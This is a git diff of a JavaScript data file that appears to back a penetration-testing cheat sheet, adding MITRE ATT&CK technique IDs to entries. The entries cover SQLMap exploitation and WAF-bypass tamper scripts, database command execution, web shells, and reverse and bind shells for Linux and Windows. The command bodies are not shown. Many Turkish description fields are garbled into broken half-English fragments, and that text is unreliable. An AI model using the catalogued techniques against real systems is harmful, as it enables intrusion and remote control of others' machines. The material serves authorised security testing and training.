@@ -3781,7 +4413,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate SQLite tables"
+            "desc_tr": "Enumerate SQLite tables",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLite Table Schema",
@@ -3790,7 +4425,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get table DDL/schema"
+            "desc_tr": "Get table DDL/schema",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "UNION Extraction"
@@ -3960,7 +4598,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Basic SQLi detection GET parameter üzerinde"
+            "desc_tr": "Basic SQLi detection GET parameter üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap POST Request",
@@ -3970,7 +4611,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Test et: POST parameters for SQLi"
+            "desc_tr": "Test et: POST parameters for SQLi",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap with Cookie",
@@ -3979,7 +4623,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Test et: sessicookie ile üzerinde"
+            "desc_tr": "Test et: sessicookie ile üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap from Request File",
@@ -3990,7 +4637,10 @@ module.exports = [
               "tool"
             ],
             "note": "Save request from Burp: Right-click > Save Item",
-            "desc_tr": "Use kayıtlı Burp request file"
+            "desc_tr": "Use kayıtlı Burp request file",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Enumerate Databases",
@@ -4000,7 +4650,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Tüm veritabanlarını listele"
+            "desc_tr": "Tüm veritabanlarını listele",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Enumerate Tables",
@@ -4010,7 +4663,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "List tables in a database"
+            "desc_tr": "List tables in a database",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Enumerate Columns",
@@ -4020,7 +4676,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "List columns in a table"
+            "desc_tr": "List columns in a table",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Dump Table",
@@ -4030,7 +4689,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Dump data from a table"
+            "desc_tr": "Dump data from a table",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap OS Shell",
@@ -4040,7 +4702,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Get an interactive OS shell via SQLi"
+            "desc_tr": "Get an interactive OS shell via SQLi",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap File Read",
@@ -4050,7 +4715,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Read file from target filesystem"
+            "desc_tr": "Read file from target filesystem",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap File Write",
@@ -4060,7 +4728,11 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Write file to target filesystem"
+            "desc_tr": "Write file to target filesystem",
+            "attack": [
+              "T1190",
+              "T1505.003"
+            ]
           },
           {
             "title": "SQLMap Specify Technique",
@@ -4070,7 +4742,10 @@ module.exports = [
               "tool"
             ],
             "note": "B=Boolean, E=Error, U=Union, S=Stacked, T=Time",
-            "desc_tr": "Use belirli enjeksiytechniques üzerinde"
+            "desc_tr": "Use belirli enjeksiytechniques üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap with Tamper Script",
@@ -4080,7 +4755,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Use tamper scripts bypass WAF'e"
+            "desc_tr": "Use tamper scripts bypass WAF'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap High Risk/Level",
@@ -4089,7 +4767,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Maximum enjeksiytesting intensity üzerinde"
+            "desc_tr": "Maximum enjeksiytesting intensity üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Specific DBMS",
@@ -4098,7 +4779,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Target a belirli database type"
+            "desc_tr": "Target a belirli database type",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Dump All",
@@ -4107,7 +4791,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Dump entire database"
+            "desc_tr": "Dump entire database",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Tamper space2comment",
@@ -4117,7 +4804,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Replace spaces with comments to bypass WAF"
+            "desc_tr": "Replace spaces with comments to bypass WAF",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Tamper charencode",
@@ -4127,7 +4817,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "URL-kodlama characters bypass WAF'e"
+            "desc_tr": "URL-kodlama characters bypass WAF'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Tamper randomcase",
@@ -4137,7 +4830,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Randomize SQL keyword case bypass WAF'e"
+            "desc_tr": "Randomize SQL keyword case bypass WAF'e",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Tamper between",
@@ -4147,7 +4843,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Replace > with BETWEEN to bypass WAF"
+            "desc_tr": "Replace > with BETWEEN to bypass WAF",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Tamper Chain (WAF Bypass)",
@@ -4157,7 +4856,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Chamultiple tamper scripts for aggressive WAF bypass içinde"
+            "desc_tr": "Chamultiple tamper scripts for aggressive WAF bypass içinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Second-Order SQLi",
@@ -4168,7 +4870,10 @@ module.exports = [
               "tool"
             ],
             "note": "inject_request.txt stores payload, trigger_request.txt retrieves output",
-            "desc_tr": "Test et: second-order enjeksiyseparate request üzerinden üzerinde"
+            "desc_tr": "Test et: second-order enjeksiyseparate request üzerinden üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap with Proxy (Burp)",
@@ -4177,7 +4882,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Route SQLMap through Burp for inspection"
+            "desc_tr": "Route SQLMap through Burp for inspection",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Custom Injection Point",
@@ -4187,7 +4895,10 @@ module.exports = [
               "tool"
             ],
             "note": "Use * to mark the injection point",
-            "desc_tr": "Mark özel enjeksiypoint request üzerinde içinde"
+            "desc_tr": "Mark özel enjeksiypoint request üzerinde içinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Multi Tampers",
@@ -4196,7 +4907,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Chatamper scripts içinde"
+            "desc_tr": "Chatamper scripts içinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap via Proxy",
@@ -4205,7 +4919,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Route through proxy"
+            "desc_tr": "Route through proxy",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Risk/Level",
@@ -4214,7 +4931,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Max detectisensitivity üzerinde"
+            "desc_tr": "Max detectisensitivity üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Random Agent",
@@ -4223,7 +4943,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "User-Agent'ı rastgeleleştir"
+            "desc_tr": "User-Agent'ı rastgeleleştir",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "SQLMap Second-Order",
@@ -4232,7 +4955,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "İkincil (second-order) SQLi testi"
+            "desc_tr": "İkincil (second-order) SQLi testi",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "SQLMap Automation"
@@ -4260,7 +4986,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "xp_cmdshell ile OS komutu çalıştır"
+            "desc_tr": "xp_cmdshell ile OS komutu çalıştır",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "MSSQL Steal Hash (xp_dirtree)",
@@ -4330,7 +5059,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Write data to a file"
+            "desc_tr": "Write data to a file",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PostgreSQL COPY FROM File",
@@ -4401,7 +5133,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "ters bağlantı kabuğu COPY PROGRAM üzerinden"
+            "desc_tr": "ters bağlantı kabuğu COPY PROGRAM üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "PostgreSQL Techniques"
@@ -4453,7 +5188,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "NoSQL enjeksiyURL-encoded parameters üzerinde üzerinden"
+            "desc_tr": "NoSQL enjeksiyURL-encoded parameters üzerinde üzerinden",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "NoSQL Regex Password Extraction",
@@ -4475,7 +5213,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Otomatik NoSQL enjeksiytarayıcı üzerinde"
+            "desc_tr": "Otomatik NoSQL enjeksiytarayıcı üzerinde",
+            "attack": [
+              "T1190"
+            ]
           },
           {
             "title": "MongoDB $in Operator Injection",
@@ -4520,7 +5261,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Otomatik NoSQL enjeksiyon"
+            "desc_tr": "Otomatik NoSQL enjeksiyon",
+            "attack": [
+              "T1190"
+            ]
           }
         ],
         "name_tr": "NoSQL Injection"
@@ -4961,7 +5705,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "CSRF XMLHttpRequest XSS kullanarak üzerinden"
+            "desc_tr": "CSRF XMLHttpRequest XSS kullanarak üzerinden",
+            "attack": [
+              "T1136"
+            ]
           },
           {
             "title": "CSRF via Fetch API",
@@ -5082,7 +5829,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Generate PHP reverse shell script"
+            "desc_tr": "Generate PHP reverse shell script",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "JSP Reverse Shell",
@@ -5091,7 +5841,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Generate JSP reverse shell"
+            "desc_tr": "Generate JSP reverse shell",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "WAR Reverse Shell",
@@ -5120,7 +5873,10 @@ module.exports = [
               "essential",
               "tool"
             ],
-            "desc_tr": "Generate ASPX reverse shell"
+            "desc_tr": "Generate ASPX reverse shell",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Python Reverse Shell",
@@ -5147,7 +5903,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Generate PowerShell reverse shell payload"
+            "desc_tr": "Generate PowerShell reverse shell payload",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "msfvenom Windows HTTPS",
@@ -5308,7 +6067,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Minimal PHP web kabuğu"
+            "desc_tr": "Minimal PHP web kabuğu",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Passthru Shell",
@@ -5317,7 +6079,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP shell passthru() kullanarak"
+            "desc_tr": "PHP shell passthru() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Shell_Exec Shell",
@@ -5326,7 +6091,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP shell shell_exec() kullanarak"
+            "desc_tr": "PHP shell shell_exec() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Proc_Open Shell",
@@ -5335,7 +6103,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "PHP shell proc_open() kullanarak"
+            "desc_tr": "PHP shell proc_open() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "ASPX Web Shell",
@@ -5344,7 +6115,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Minimal ASPX web kabuğu"
+            "desc_tr": "Minimal ASPX web kabuğu",
+            "attack": [
+              "T1059.003",
+              "T1505.003"
+            ]
           },
           {
             "title": "JSP Web Shell",
@@ -5353,7 +6128,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Minimal JSP web kabuğu"
+            "desc_tr": "Minimal JSP web kabuğu",
+            "attack": [
+              "T1505.003"
+            ]
           }
         ],
         "name_tr": "Web Shells"
@@ -5377,7 +6155,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Generate HTA file with PowerShell payload"
+            "desc_tr": "Generate HTA file with PowerShell payload",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "MSI Installer Payload",
@@ -5584,7 +6365,9 @@ module.exports = [
               "essential"
             ],
             "desc_tr": "Bash TCP ters bağlantı kabuğu",
-            "attack": "T1059.004",
+            "attack": [
+              "T1059.004"
+            ],
             "ref": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md"
           },
           {
@@ -5594,7 +6377,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Alternative bash ters bağlantı kabuğu file descriptors kullanarak"
+            "desc_tr": "Alternative bash ters bağlantı kabuğu file descriptors kullanarak",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Bash Reverse Shell (exec)",
@@ -5603,7 +6389,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Bash ters bağlantı kabuğu exec redirectiile üzerinde"
+            "desc_tr": "Bash ters bağlantı kabuğu exec redirectiile üzerinde",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Python3 Reverse Shell",
@@ -5612,7 +6401,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Python3 one-liner ters bağlantı kabuğu"
+            "desc_tr": "Python3 one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Python2 Reverse Shell",
@@ -5621,7 +6413,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Python2 one-liner ters bağlantı kabuğu"
+            "desc_tr": "Python2 one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "PHP Reverse Shell",
@@ -5630,7 +6425,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP one-liner ters bağlantı kabuğu"
+            "desc_tr": "PHP one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Perl Reverse Shell",
@@ -5639,7 +6437,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Perl one-liner ters bağlantı kabuğu"
+            "desc_tr": "Perl one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Ruby Reverse Shell",
@@ -5648,7 +6449,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Ruby one-liner ters bağlantı kabuğu"
+            "desc_tr": "Ruby one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Netcat Reverse Shell (-e)",
@@ -5658,7 +6462,10 @@ module.exports = [
               "essential"
             ],
             "note": "Only on netcat versions with -e flag (traditional)",
-            "desc_tr": "Netcat ters bağlantı kabuğu -e optiile üzerinde"
+            "desc_tr": "Netcat ters bağlantı kabuğu -e optiile üzerinde",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Netcat Reverse Shell (mkfifo)",
@@ -5667,7 +6474,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Netcat ters bağlantı kabuğu -e flag olmadan"
+            "desc_tr": "Netcat ters bağlantı kabuğu -e flag olmadan",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Socat Reverse Shell",
@@ -5676,7 +6486,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Socat ters bağlantı kabuğu"
+            "desc_tr": "Socat ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Socat Encrypted Reverse Shell",
@@ -5685,7 +6498,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Socat ters bağlantı kabuğu over encrypted channel"
+            "desc_tr": "Socat ters bağlantı kabuğu over encrypted channel",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Lua Reverse Shell",
@@ -5694,7 +6510,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Lua one-liner ters bağlantı kabuğu"
+            "desc_tr": "Lua one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Awk Reverse Shell",
@@ -5713,7 +6532,10 @@ module.exports = [
               "advanced"
             ],
             "note": "Use in Jenkins Groovy Script Console",
-            "desc_tr": "Groovy ters bağlantı kabuğu for Jenkins Script Console"
+            "desc_tr": "Groovy ters bağlantı kabuğu for Jenkins Script Console",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Node.js Reverse Shell",
@@ -5722,7 +6544,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Node.js one-liner ters bağlantı kabuğu"
+            "desc_tr": "Node.js one-liner ters bağlantı kabuğu",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Golang Reverse Shell",
@@ -5752,7 +6577,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Encrypted ters bağlantı kabuğu OpenSSL üzerinden"
+            "desc_tr": "Encrypted ters bağlantı kabuğu OpenSSL üzerinden",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Busybox NC Shell",
@@ -5770,7 +6598,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Jenkins konsolu için kabuk"
+            "desc_tr": "Jenkins konsolu için kabuk",
+            "attack": [
+              "T1059.004"
+            ]
           }
         ],
         "name_tr": "Linux Reverse Shells"
@@ -5785,7 +6616,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PowerShell TCP ters bağlantı kabuğu one-liner"
+            "desc_tr": "PowerShell TCP ters bağlantı kabuğu one-liner",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Base64 Reverse Shell",
@@ -5797,7 +6631,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Base64-encoded PowerShell ters bağlantı kabuğu"
+            "desc_tr": "Base64-encoded PowerShell ters bağlantı kabuğu",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell Download & Execute",
@@ -5806,7 +6643,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Download and execute reverse shell script"
+            "desc_tr": "Download and execute reverse shell script",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Nishang Invoke-PowerShellTcp",
@@ -5815,7 +6655,10 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "Nishang ters bağlantı kabuğu module"
+            "desc_tr": "Nishang ters bağlantı kabuğu module",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "ConPtyShell (Full Interactive)",
@@ -5830,7 +6673,10 @@ module.exports = [
               "advanced",
               "tool"
             ],
-            "desc_tr": "Fully interactive Windows ters bağlantı kabuğu"
+            "desc_tr": "Fully interactive Windows ters bağlantı kabuğu",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "Windows Netcat Reverse Shell",
@@ -5839,7 +6685,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Netcat ters bağlantı kabuğu Windows üzerinde"
+            "desc_tr": "Netcat ters bağlantı kabuğu Windows üzerinde",
+            "attack": [
+              "T1059.003"
+            ]
           },
           {
             "title": "PowerShell Reverse Shell (Compact)",
@@ -5848,7 +6697,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Shorter PowerShell ters bağlantı kabuğu one-liner"
+            "desc_tr": "Shorter PowerShell ters bağlantı kabuğu one-liner",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerShell RunspacePool Shell",
@@ -5857,7 +6709,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "ters bağlantı kabuğu RunspacePool for stealth kullanarak"
+            "desc_tr": "ters bağlantı kabuğu RunspacePool for stealth kullanarak",
+            "attack": [
+              "T1059.001"
+            ]
           },
           {
             "title": "PowerCat Reverse Shell",
@@ -5866,7 +6721,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "PowerShell netcat ters bağlantı kabuğu module"
+            "desc_tr": "PowerShell netcat ters bağlantı kabuğu module",
+            "attack": [
+              "T1059.001",
+              "T1059.003"
+            ]
           },
           {
             "title": "mshta Shell",
@@ -5875,7 +6734,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Shell mshta LOLBüzerinden içinde"
+            "desc_tr": "Shell mshta LOLBüzerinden içinde",
+            "attack": [
+              "T1218.005"
+            ]
           },
           {
             "title": "regsvr32 Shell",
@@ -5884,7 +6746,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Shell regsvr32 AppLocker bypass üzerinden"
+            "desc_tr": "Shell regsvr32 AppLocker bypass üzerinden",
+            "attack": [
+              "T1218.010"
+            ]
           },
           {
             "title": "PowerCat Shell",
@@ -5896,7 +6761,11 @@ module.exports = [
             "tags": [
               "tool"
             ],
-            "desc_tr": "PowerShell netcat alternatifi"
+            "desc_tr": "PowerShell netcat alternatifi",
+            "attack": [
+              "T1059.001",
+              "T1059.003"
+            ]
           },
           {
             "title": "ConPtyShell",
@@ -5908,7 +6777,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Tam etkileşimli Windows kabuğu"
+            "desc_tr": "Tam etkileşimli Windows kabuğu",
+            "attack": [
+              "T1059.001"
+            ]
           }
         ],
         "name_tr": "Windows Reverse Shells"
@@ -5923,7 +6795,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Start a bind shell listener on target"
+            "desc_tr": "Start a bind shell listener on target",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Netcat Bind Shell (mkfifo)",
@@ -5932,7 +6807,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "dinleyen kabuk -e flag olmadan"
+            "desc_tr": "dinleyen kabuk -e flag olmadan",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Socat Bind Shell",
@@ -5941,7 +6819,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Socat dinleyen kabuk TTY ile"
+            "desc_tr": "Socat dinleyen kabuk TTY ile",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Python Bind Shell",
@@ -5950,7 +6831,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Pythdinleyen kabuk üzerinde"
+            "desc_tr": "Pythdinleyen kabuk üzerinde",
+            "attack": [
+              "T1059.006"
+            ]
           },
           {
             "title": "Connect to Bind Shell",
@@ -5974,7 +6858,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP web kabuğu system() kullanarak"
+            "desc_tr": "PHP web kabuğu system() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Passthru Shell",
@@ -5983,7 +6870,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP web kabuğu passthru() kullanarak"
+            "desc_tr": "PHP web kabuğu passthru() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Shell_Exec Shell",
@@ -5992,7 +6882,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP web kabuğu shell_exec() kullanarak"
+            "desc_tr": "PHP web kabuğu shell_exec() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Exec Shell",
@@ -6001,7 +6894,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "PHP web kabuğu exec() kullanarak"
+            "desc_tr": "PHP web kabuğu exec() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "PHP Proc_Open Shell",
@@ -6010,7 +6906,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "PHP web kabuğu proc_open() kullanarak"
+            "desc_tr": "PHP web kabuğu proc_open() kullanarak",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Kali PHP Reverse Shell",
@@ -6020,7 +6919,10 @@ module.exports = [
               "essential"
             ],
             "note": "Edit $ip and $port in the file before uploading",
-            "desc_tr": "Use the full-featured Kali PHP ters bağlantı kabuğu"
+            "desc_tr": "Use the full-featured Kali PHP ters bağlantı kabuğu",
+            "attack": [
+              "T1505.003"
+            ]
           },
           {
             "title": "Access Web Shell",
@@ -6029,7 +6931,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Execute commands via uploaded web shell"
+            "desc_tr": "Execute commands via uploaded web shell",
+            "attack": [
+              "T1505.003"
+            ]
           }
         ],
         "name_tr": "Web Shells"
@@ -6044,7 +6949,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Spawn a PTY shell with Python"
+            "desc_tr": "Spawn a PTY shell with Python",
+            "attack": [
+              "T1059.004",
+              "T1059.006"
+            ]
           },
           {
             "title": "Python2 PTY Spawn",
@@ -6053,7 +6962,11 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Spawn a PTY shell with Python2"
+            "desc_tr": "Spawn a PTY shell with Python2",
+            "attack": [
+              "T1059.004",
+              "T1059.006"
+            ]
           },
           {
             "title": "Script PTY Spawn",
@@ -6078,7 +6991,11 @@ module.exports = [
               "essential"
             ],
             "note": "Get your terminal size with: stty size",
-            "desc_tr": "Complete process get a fully interactive shell'e"
+            "desc_tr": "Complete process get a fully interactive shell'e",
+            "attack": [
+              "T1059.004",
+              "T1059.006"
+            ]
           },
           {
             "title": "Expect PTY Spawn",
@@ -6087,7 +7004,10 @@ module.exports = [
             "tags": [
               "advanced"
             ],
-            "desc_tr": "Spawn PTY via expect"
+            "desc_tr": "Spawn PTY via expect",
+            "attack": [
+              "T1059.004"
+            ]
           },
           {
             "title": "Socat TTY Upgrade",
@@ -6152,7 +7072,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get detailed system information"
+            "desc_tr": "Get detailed system information",
+            "attack": [
+              "T1082"
+            ]
           },
           {
             "title": "Hostname",
@@ -6170,7 +7093,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Display mevcut username"
+            "desc_tr": "Display mevcut username",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "User Privileges",
@@ -6179,7 +7105,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all privileges for current user"
+            "desc_tr": "List all privileges for current user",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "User Groups",
@@ -6188,7 +7117,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List all group memberships"
+            "desc_tr": "List all group memberships",
+            "attack": [
+              "T1033"
+            ]
           },
           {
             "title": "List Local Users",
@@ -6197,7 +7129,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Enumerate all local user accounts"
+            "desc_tr": "Enumerate all local user accounts",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "User Details",
@@ -6206,7 +7141,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Get details for a specific user"
+            "desc_tr": "Get details for a specific user",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Local Administrators",
@@ -6215,7 +7153,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "List members of administrators group"
+            "desc_tr": "List members of administrators group",
+            "attack": [
+              "T1087"
+            ]
           },
           {
             "title": "Network Configuration",
@@ -6224,7 +7165,10 @@ module.exports = [
             "tags": [
               "essential"
             ],
-            "desc_tr": "Display ağ arayüzü configuration"
